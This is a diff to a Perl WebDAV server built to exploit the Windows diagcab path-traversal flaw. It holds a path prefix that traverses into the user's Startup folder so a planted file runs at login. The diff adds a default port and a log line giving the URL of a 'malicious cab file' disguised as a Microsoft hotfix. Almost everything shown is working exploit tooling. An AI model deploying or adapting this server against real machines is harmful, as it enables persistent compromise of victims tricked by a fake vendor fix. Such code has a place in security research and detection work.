@@ -7,7 +7,7 @@ use warnings;
 use IO::Socket::INET;
 
 my $MALICIOUS_PATH_PREFIX = $ENV{MALICIOUS_PATH_PREFIX} || "..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
-my $port = $ENV{PORT}; # heroku gonna dispatch the port to listen on as an environment variable
+my $port = $ENV{PORT} || "8080";
 die "Usage: set the PORT environment variable to control where the webdav server should be listening" if(!$port);
 
 $| = 1;
@@ -26,7 +26,14 @@ my $socket = new IO::Socket::INET (
 );
 
 die "cannot create socket: $!\n" unless $socket;
-mylog("diagcab webdav server waiting for client connections on port $port");
+if ( @ARGV > 0 )
+{
+  mylog('malicious cab file is hosted on:  https://' .$ARGV[0] .'/config/hotfix895214.diagcab');
+}else{
+   mylog("diagcab webdav server waiting for client connections on port $port");
+}
+
+
 
 while(1) {
    my $client_socket = $socket->accept();
